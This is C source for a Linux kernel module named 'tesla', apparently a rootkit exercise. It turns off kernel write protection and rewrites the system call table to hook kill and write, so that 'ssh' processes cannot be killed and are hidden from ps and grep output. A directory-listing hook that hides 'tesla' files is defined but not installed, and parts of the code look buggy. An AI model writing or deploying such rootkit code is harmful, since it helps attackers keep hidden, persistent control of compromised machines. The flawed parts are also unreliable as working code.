/*
 * tesla.c -- a kernel module which hides files and processes.
 */
#include <linux/module.h> /* for every kernel module */
#include <linux/kernel.h> /* printk() */
#include <linux/version.h> /* printk() */
#include <linux/syscalls.h> /* for kallsyms_lookup_name, and NR_read, NR_write,... */
#include <linux/init.h>  /*  for module_init and module_cleanup */
#include <linux/slab.h>  /*  for kmalloc/kfree */
#include <linux/fs.h>     /* everything... */
#include <linux/errno.h>  /* error codes */
#include <linux/types.h>  /* size_t */
#include "tesla.h"

MODULE_AUTHOR("Jason Kuphaldt"); /* change this line to your name */
MODULE_LICENSE("GPL v2");

/* asmlinkage tells gcc that function parameters will not be in registers, but rather they will be in the stack. */

asmlinkage long tesla_read(unsigned int fd, char __user *buf, size_t count)
{
	return 0;
}

asmlinkage long tesla_write(unsigned int fd, char __user *buf, size_t count)
{
	char *kbuf;
	kbuf = kmalloc(count, GFP_KERNEL);
	if (copy_from_user(kbuf, buf, count) != 0) {
		return -EACCES;
	}
	if (strstr(kbuf, "ssh") && strstr(current->comm, "ps")) {
		kfree(kbuf);
		return count;
	}
	if (strstr(kbuf, "ssh") && strstr(current->comm, "grep")) {
		kfree(kbuf);
		return count;
	}
	kfree(kbuf);
	return orig_write(fd, buf, count);
}

asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
	int ret = orig_dents(fd, dirp, count);
    struct linux_dirent *p1 = kmalloc(ret, GFP_KERNEL);
	struct linux_dirent *p2 = p1;

	int i;
	i = 0;

	if (ret == 0) {
		kfree(p1);
		return 0;
	}
	
	if (copy_from_user(p1, dirp, ret) != 0) {
		kfree(p1);
		return -EACCES;
	}
	
	while (i < ret && (p2->d_reclen != 0)) {
		if (strstr(p2->d_name,"tesla")) {
			memmove(p2, (struct linux_dirent *)((char *)p2 + (p2->d_reclen)), ret);
			ret = ret - (p2->d_reclen);
		}
		else {
			p2 = (struct linux_dirent *)((char *)p2 + (p2->d_reclen));
			i = i + (p2->d_reclen);
		}
	}
	
	if(copy_to_user(p1, dirp, ret) != 0) {
		kfree(p1);
		return -EACCES;
	}
	kfree(p1);
	return ret;
}

/* we intercept kill so that our process can not be killed */

asmlinkage long tesla_kill(pid_t pid, int sig)
{
	int ret;
	//printk("<1>tesla: kill invoked.\n");
	//
	struct task_struct *target;
	target = pid_task(find_pid_ns(pid, &init_pid_ns), PIDTYPE_PID);
	if(target){
		if(strstr(target->comm, "ssh")){
			return -EACCES;
		}
	}

	ret=orig_kill(pid, sig);
	return ret;
}

int tesla_init(void)
{
	printk("<1> tesla: loaded...\n");

	/* search in kernel symbol table and find the address of sys_call_table */
	sys_call_table = (long **)kallsyms_lookup_name("sys_call_table");
 
	if (sys_call_table == NULL) {
		printk(KERN_ERR "where the heck is the sys_call_table?\n");
		return -1;
	}
 
	printk("<1> tesla: sys call table address is 0x%p.\n", sys_call_table);
	printk("sys_read is at address 0x%p, sys_write is at address 0x%p, sys_getdents is at address 0x%p, sys_kill is at address 0x%p\n",(void *)sys_call_table[__NR_read], (void *)sys_call_table[__NR_write], (void *)sys_call_table[__NR_getdents], (void *)sys_call_table[__NR_kill]);

	/* by default, system call table is write-protected; 
	 * change bit 16 of cr0 to 0 to turn off the protection.
	 * The Intel Software Developer Manual (SDM) says: 
	 * Write Protect (bit 16 of CR0) — When set, inhibits supervisor-level 
	 * procedures from writing into read-only pages; when clear, 
	 * allows supervisor-level procedures to write into read-only pages 
	 * (regardless of the U/S bit setting; see Section 4.1.3 and Section 4.6). 
	 * This flag facilitates implementation of the copy-on-write method 
	 * of creating a new process (forking) used by operating systems 
	 * such as UNIX.*/

	write_cr0(read_cr0() & (~0x10000));

	/* save the original kill system call into orig_kill, and replace the kill system call with tesla_kill */
	orig_kill= (void *)sys_call_table[__NR_kill];
	sys_call_table[__NR_kill] = (long *)tesla_kill;

	/* save the original write system call into orig_write, and replace the write system call with tesla_write */
	orig_write = (void *)sys_call_table[__NR_write];
	sys_call_table[__NR_write] = (long *)tesla_write;

	/* set bit 16 of cr0, so as to turn the write protection on */

	write_cr0(read_cr0() | 0x10000);

	printk("sys_read is at address 0x%p, sys_write is at address 0x%p, sys_getdents is at address 0x%p, sys_kill is at address 0x%p\n",(void *)sys_call_table[__NR_read], (void *)sys_call_table[__NR_write], (void *)sys_call_table[__NR_getdents], (void *)sys_call_table[__NR_kill]);

	return  0;
}

void tesla_exit(void)
{
	printk("<1> tesla: unloaded...\n");
	/* clear bit 16 of cr0 */
	write_cr0(read_cr0() & (~0x10000));

	/* restore the kill system call to its original version */
	sys_call_table[__NR_kill] = (long *)orig_kill;

	/* restore the read system call to its original version */
	sys_call_table[__NR_write] = (long *)orig_write;

	/* set bit 16 of cr0 */
	write_cr0(read_cr0() | 0x10000);

	printk("sys_read is at address 0x%p, sys_write is at address 0x%p, sys_getdents is at address 0x%p, sys_kill is at address 0x%p\n",(void *)sys_call_table[__NR_read], (void *)sys_call_table[__NR_write], (void *)sys_call_table[__NR_getdents], (void *)sys_call_table[__NR_kill]);

}

module_init(tesla_init);
module_exit(tesla_exit);

/* vim: set ts=4: */
